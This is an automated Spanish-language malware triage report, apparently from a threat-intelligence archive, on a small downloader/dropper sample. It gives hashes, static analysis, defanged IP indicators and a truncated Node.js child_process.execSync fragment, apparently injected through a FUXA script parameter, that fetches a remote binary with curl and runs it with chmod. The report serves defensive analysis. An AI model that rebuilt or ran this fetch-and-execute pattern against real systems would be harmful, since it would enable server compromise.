# 🧬 Payload Analysis

`27913cdb1a8d6896167557c865c200b033fe481489bbecd8d2783a1094f93453`

## 📌 Resumen

Texto ASCII de 1.1 KiB. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `cumshotnews` en `hxxp://192.142.28.XXX/cumshotnews`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod`
2. `curl`
3. `cd /var/run`
4. `cd /m` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/27913cdb1a8d6896167557c865c200b033fe481489bbecd8d2783a1094f93453.md](../../../../../malware-like/oraculo/downloader/27913cdb1a8d6896167557c865c200b033fe481489bbecd8d2783a1094f93453.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:23:38.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `27913cdb1a8d6896167557c865c200b033fe481489bbecd8d2783a1094f93453`
- **SHA1:** `29618592cff47b9ff86aba26aad81332b0b5a559`
- **MD5:** `3205f80ca5de588175e352bba5069b05`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (896), with CRLF line terminators |
| Tamaño | 1.1 KiB |
| Entropía | 5.33 |
| Strings | 8 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (896), with CRLF line terminators; iocs=7

## 🖥️ Comandos observados / extraídos

```text
{"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp||cd /var/run||cd /m
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://192.142.28.XXX/cumshotnews;chmod | strings |
| url | hxxp://192.142.28.XXX/cumshotnews;curl | strings |
| url | hxxp://190.179.128.XXX:1881/fuxa | strings |
| ip | 190.179.128.XXX | static_analysis |
| ip | 192.142.28.XXX | static_analysis |
| command | {"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp\|\|cd /var/run\|\|cd /m | strings |
| hash | 27913cdb1a8d6896167557c865c200b033fe481489bbecd8d2783a1094f93453 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
